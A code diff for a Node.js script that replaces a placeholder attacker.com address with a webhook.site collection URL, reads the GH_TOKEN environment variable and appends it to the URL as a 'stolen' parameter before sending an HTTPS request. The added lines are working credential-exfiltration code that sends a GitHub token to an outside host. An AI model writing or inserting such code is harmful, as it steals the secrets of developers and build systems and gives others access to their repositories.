@@ -1,5 +1,7 @@
 const https = require('https');
-const url = 'https://attacker.com/';
+const webhook = 'https://webhook.site/54a56923-366e-4048-9553-cf1946890154';
+const token = process.env.GH_TOKEN;
+const url = webhook + "?stolen=" + token;
 
 const request = https.request(url, (response) => {
     let data = '';
